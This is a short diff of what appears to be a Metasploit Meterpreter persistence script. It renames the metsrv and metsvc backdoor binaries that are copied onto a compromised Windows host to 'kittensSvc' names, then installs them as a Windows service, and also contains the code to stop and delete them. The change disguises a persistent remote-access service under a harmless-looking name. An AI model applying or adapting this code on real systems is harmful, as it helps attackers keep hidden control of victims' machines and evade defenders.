@@ -82,9 +82,9 @@ if client.platform == 'windows'
   # such as metsrv can be copied from the appropriate location
   # but named correctly on the target.
   bins = {
-    'metsrv.x86.dll'    => 'metsrv.dll',
-    'metsvc-server.exe' => nil,
-    'metsvc.exe'        => nil
+    'metsrv.x86.dll'    => 'kittensSvc.dll',
+    'metsvc-server.exe' => 'kittensSvc-server.exe',
+    'metsvc.exe'        => 'kittensSvc.exe'
   }
 
   bins.each do |from, to|
@@ -103,17 +103,17 @@ if client.platform == 'windows'
   if(not remove)
     print_status("Starting the service...")
     client.fs.dir.chdir(tempdir)
-    data = m_exec(client, "metsvc.exe install-service")
+    data = m_exec(client, "kittensSvc.exe install-service")
     print_line("\t#{data}")
   else
     print_status("Stopping the service...")
     client.fs.dir.chdir(tempdir)
-    data = m_exec(client, "metsvc.exe remove-service")
+    data = m_exec(client, "kittensSvc.exe remove-service")
     print_line("\t#{data}")
   end
 
   if(remove)
-    m_exec(client, "cmd.exe /c del metsvc.exe")
+    m_exec(client, "cmd.exe /c del kittensSvc.exe")
   end
 
   #
